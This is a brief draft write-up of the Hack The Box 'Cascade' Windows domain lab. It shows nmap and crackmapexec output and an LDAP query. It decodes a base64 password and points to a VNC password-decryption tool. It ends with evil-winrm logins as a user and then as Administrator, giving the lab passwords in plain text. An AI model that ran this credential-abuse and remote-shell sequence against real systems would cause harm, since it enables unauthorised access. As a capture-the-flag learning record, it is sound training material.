---
title: HTB Cascade
date: 2024-06-19
author: kei5uke
draft: true
description: Writeup for HTB Cascade
tags:
  - windows
  - writeup
---

# TCP Scan

```
# Nmap 7.94SVN scan initiated Wed Jun 19 16:55:14 2024 as: nmap -sC -sV -A -oN nmap_tcp.txt -T4 --min-rate 10000 10.129.242.138
Nmap scan report for 10.129.242.138
Host is up (0.029s latency).
Not shown: 987 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-06-19 20:55:20Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cascade.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  msrpc         Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|phone|specialized
Running (JUST GUESSING): Microsoft Windows 8|Phone|7|2008|8.1|Vista (92%)
OS CPE: cpe:/o:microsoft:windows_8 cpe:/o:microsoft:windows cpe:/o:microsoft:windows_7 cpe:/o:microsoft:windows_server_2008:r2 cpe:/o:microsoft:windows_8.1 cpe:/o:microsoft:windows_vista::- cpe:/o:microsoft:windows_vista::sp1
Aggressive OS guesses: Microsoft Windows 8.1 Update 1 (92%), Microsoft Windows Phone 7.5 or 8.0 (92%), Microsoft Windows Embedded Standard 7 (91%), Microsoft Windows 7 or Windows Server 2008 R2 (89%), Microsoft Windows Server 2008 R2 (89%), Microsoft Windows Server 2008 R2 or Windows 8.1 (89%), Microsoft Windows Server 2008 R2 SP1 or Windows 8 (89%), Microsoft Windows 7 (89%), Microsoft Windows 7 Professional or Windows 8 (89%), Microsoft Windows 7 SP1 or Windows Server 2008 R2 (89%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: CASC-DC1; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2024-06-19T20:56:14
|_  start_date: 2024-06-19T20:50:18
|_clock-skew: -1s

TRACEROUTE (using port 53/tcp)
HOP RTT      ADDRESS
1   28.28 ms 10.10.14.1
2   28.56 ms 10.129.242.138

```

# Enumeration

## SMB

```
┌───(root@kali)-[~/htb/cas/IT]
└─# crackmapexec smb 10.129.248.172 -u "r.thompson" -p "rY4n5eva" -d cascade.local --shares
SMB         10.129.248.172  445    CASC-DC1         [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:CASC-DC1) (domain:cascade.local) (signing:True) (SMBv1:False)
SMB         10.129.248.172  445    CASC-DC1         [+] cascade.local\r.thompson:rY4n5eva 
SMB         10.129.248.172  445    CASC-DC1         [+] Enumerated shares
SMB         10.129.248.172  445    CASC-DC1         Share           Permissions     Remark
SMB         10.129.248.172  445    CASC-DC1         -----           -----------     ------
SMB         10.129.248.172  445    CASC-DC1         ADMIN$                          Remote Admin
SMB         10.129.248.172  445    CASC-DC1         Audit$                          
SMB         10.129.248.172  445    CASC-DC1         C$                              Default share
SMB         10.129.248.172  445    CASC-DC1         Data            READ            
SMB         10.129.248.172  445    CASC-DC1         IPC$                            Remote IPC
SMB         10.129.248.172  445    CASC-DC1         NETLOGON        READ            Logon server share 
SMB         10.129.248.172  445    CASC-DC1         print$          READ            Printer Drivers
SMB         10.129.248.172  445    CASC-DC1         SYSVOL          READ            Logon server share 
```

## LDAP

`python3 [windapsearch.py](http://windapsearch.py/) -U --dc-ip 10.129.244.14 --full`

![[HTB Cascade - Untitled.png]]

```
┌───(root@kali)-[~/htb/cas]
└─# echo clk0bjVldmE= | base64 -d 
rY4n5eva 
```

Found  this file in SMB folder

![[HTB Cascade - Untitled 1.png]]

[https://github.com/frizb/PasswordDecrypts](https://github.com/frizb/PasswordDecrypts)

![[HTB Cascade - Untitled 2.png]]

-u "s.smith" -p "sT333ve2”

`evil-winrm -u "s.smith" -p "sT333ve2" -i 10.129.248.172`

# Shell

[Privileged Groups | HackTricks](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges#a-d-recycle-bin)

`evil-winrm -i 10.129.249.109 -u Administrator -p baCT3r1aN00dles`
